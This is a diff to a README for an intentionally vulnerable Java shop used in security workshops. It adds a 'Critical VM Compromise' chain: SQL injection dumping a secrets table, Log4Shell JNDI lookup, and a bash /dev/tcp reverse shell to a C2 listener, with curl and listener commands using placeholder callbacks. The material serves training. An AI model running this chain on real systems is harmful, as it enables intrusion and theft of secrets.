@@ -2,7 +2,7 @@
 
 Intentionally vulnerable **classic / traditional** shop for security workshops — Java on a **VM** (EC2, Azure VM, or GCP Compute Engine), not containers.
 
-Primary story: **Log4Shell (CVE-2021-44228)** via **Log4j 2.14.1**.
+Primary story: **Critical VM Compromise** — SQL injection → **Log4Shell (CVE-2021-44228)** → reverse shell to external C2.
 
 > [!CAUTION]
 > **Do not deploy to production accounts.** Keep VMs ephemeral and network-scoped to your lab.
@@ -28,7 +28,24 @@ mvn -DskipTests spring-boot:run
 
 Java **11+** and Maven required.
 
-### Log4Shell probe (workshop-safe)
+### Critical VM Compromise
+
+1. **SQL injection** — string-concat SQLite on `/search` dumps a `secrets` table.  
+2. **Log4Shell** — Log4j `2.14.1` JNDI LDAP lookup to your listener.  
+3. **Reverse shell → C2** — short-lived `bash /dev/tcp` dial to your C2 listener.
+
+```bash
+# listeners (reachable from the VM)
+python3 tools/ldap-listen.py --port 1389
+python3 tools/c2-listen.py --port 4444
+
+# or open http://HOST:8080/security and click Run Critical VM Compromise
+curl -s -X POST "http://HOST:8080/api/demo/critical-vm-compromise" \
+  --data-urlencode "ldap_callback=YOUR_IP:1389" \
+  --data-urlencode "c2_callback=YOUR_IP:4444" | jq .
+```
+
+### Log4Shell probe only (workshop-safe)
 
 1. Start a banner LDAP listener (no exploit payload served):
 
